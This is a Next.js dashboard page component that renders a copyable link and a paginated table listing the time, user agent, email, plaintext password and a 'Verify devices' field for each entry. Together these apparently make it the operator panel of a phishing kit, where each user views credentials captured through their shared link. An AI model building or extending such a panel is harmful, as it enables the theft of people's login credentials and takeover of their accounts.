import LinkCopy from "@/components/LinkCopy";
import Navbar from "@/components/Navbar";
import connectDB from "@/db";
import User from "@/db/User.Model";
import DashboardDataTable from "@/components/DashboardDataTable";
import { authCheck } from "@/actions";
import { redirect } from "next/navigation";
import { usePaginationStore } from "../store/paginationStore";
import DashboardPagination from "@/components/DashboardPagination";

export default async function Page() {
  let { id } = await authCheck();
  await connectDB();
  let user = await User.findOne({ _id: id }, { data: 0 });

  if (!user) {
    redirect("/log-in");
  }
  if (user.admin) {
    redirect("/dashboard/admin");
  }

  return (
    <>
      <Navbar />
      <div className="flex items-center flex-col justify-center ">
        <div className="w-full">
          <LinkCopy />
        </div>
        <div className="w-full sm:w-2/3">
          <div className="overflow-x-auto">
            <table className="w-full min-w-full  border-collapse">
              <thead>
                <tr>
                  <th className="px-4 border py-2">Time</th>
                  <th className="px-4 border py-2">User Agent</th>
                  <th className="px-4 border py-2">Email</th>
                  <th className="px-4 border py-2">Password</th>
                  <th className="px-4 text-nowrap border py-2">
                    Verify devices
                  </th>
                </tr>
              </thead>
              <DashboardDataTable admin={false} />
            </table>
          </div>
          <DashboardPagination />
        </div>
      </div>
    </>
  );
}
